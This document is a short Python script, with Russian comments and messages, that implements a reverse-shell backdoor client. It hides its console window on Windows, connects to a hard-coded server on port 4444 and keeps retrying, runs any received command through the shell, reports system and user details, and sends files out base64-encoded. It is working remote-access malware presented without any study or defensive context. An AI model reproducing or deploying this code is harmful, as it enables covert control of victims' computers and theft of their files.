#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import json
import base64
import time
import ctypes
import platform

# Скрываем окно
try:
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

SERVER_IP = "192.168.1.2"
SERVER_PORT = 4444

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except Exception as e:
            time.sleep(30)

def run_command(cmd):
    try:
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            return "[+] Директория изменена на: " + os.getcwd()
        elif cmd == "sysinfo":
            info = "Система: " + platform.system() + "\n"
            info += "Компьютер: " + platform.node() + "\n"
            info += "Пользователь: " + os.getlogin() + "\n"
            info += "IP адрес: " + socket.gethostbyname(socket.gethostname()) + "\n"
            return info
        elif cmd.startswith("download "):
            filepath = cmd[9:]
            if os.path.exists(filepath):
                with open(filepath, "rb") as f:
                    return base64.b64encode(f.read()).decode()
            else:
                return "[-] Файл не найден"
        elif cmd == "help":
            return "Доступные команды: cd, download, upload, sysinfo, help, exit"
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
    except Exception as e:
        return "[-] Ошибка: " + str(e)

def main():
    print("[*] Клиент запущен...")

    while True:
        try:
            sock = connect_to_server()
            sock.send(b"READY")

            while True:
                cmd = sock.recv(4096).decode().strip()
                if not cmd or cmd == "exit":
                    sock.close()
                    return

                result = run_command(cmd)
                sock.send(result.encode())

        except Exception as e:
            time.sleep(30)
            continue

if __name__ == "__main__":
    main()
